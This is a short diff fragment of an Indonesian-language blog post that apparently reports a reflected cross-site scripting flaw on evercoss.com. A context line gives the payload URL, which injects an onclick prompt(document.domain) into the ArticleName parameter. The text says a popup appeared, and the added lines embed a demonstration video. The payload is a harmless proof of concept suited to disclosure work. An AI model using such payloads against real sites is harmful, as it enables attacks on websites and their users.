@@ -30,3 +30,7 @@ http://evercoss.com/article?ArticleName=**" onclick=prompt(document.domain)//<bu
 Setelah saya memasukkan payload seperti ini timbul lah pop up xss tersebut  
   
 Jelasnya bisa lihat video dibawah
+
+  <center>
+  <iframe src="https://www.blogger.com/video.g?token=AD6v5dzebQLtKWhHGHHT5-cpfpNqsvENuKltH7jOLCLvR58k9EJGK_JU9jDXnpY4SS0Jqk3J-r_aA_wksvygpCiBDjqSBC-XjRG0ZFddj0S7bJAU1e1CYqrAVnAQlUxCsdrPIIle8JQ" width="350" height="250" mozallowfullscreen="mozallowfullscreen"></iframe>
+  </center>
